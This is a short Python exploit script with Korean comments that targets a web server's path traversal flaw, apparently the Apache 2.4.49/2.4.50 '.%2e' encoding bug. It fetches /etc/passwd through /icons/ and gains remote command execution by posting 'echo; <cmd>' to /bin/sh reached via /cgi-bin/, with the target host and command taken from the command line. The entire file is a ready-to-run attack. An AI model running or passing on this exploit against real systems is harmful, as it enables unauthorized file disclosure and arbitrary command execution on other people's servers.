import sys
import requests

# /etc/passwd 정보 노출 
def path_traversal(host="localhost", port=8080, depth=7):

    path = "/".join([".%2e"] * depth) # .%2e 를 depth만큼 반복
    url = f"http://{host}:{port}/icons/{path}/etc/passwd"
    print(f"[+] 파일 정보 노출 테스트:\n    {url}\n")

    r = requests.get(url, allow_redirects=True)
    print(f"Status: {r.status_code}\n")
    print(r.text)

# CGI RCE 테스트
def cgi_rce(host="localhost", port=8080, depth=7, cmd="id"):

    path = "/".join([".%2e"] * depth)
    url = f"http://{host}:{port}/cgi-bin/{path}/bin/sh"
    print(f"[+] CGI RCE 테스트:\n    {url}\n    cmd: {cmd}\n")

    payload = f"echo; {cmd}" # echo;id 
    r = requests.post(url, data=payload)
    print(f"Status: {r.status_code}\n")
    print(r.text)

if __name__ == "__main__":

    host = sys.argv[1] if len(sys.argv) > 1 else "localhost" # 호스트 IP
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080 # 포트
    depth = int(sys.argv[3]) if len(sys.argv) > 3 else 7 # 상위디렉토리로 몇번 들어갈지 깊이
    cmd  = sys.argv[4] if len(sys.argv) > 4 else "id" # RCE에 들어갈 명령어

    path_traversal(host, port, depth)
    print("\n" + ("-"*60) + "\n")
    cgi_rce(host, port, depth, cmd)
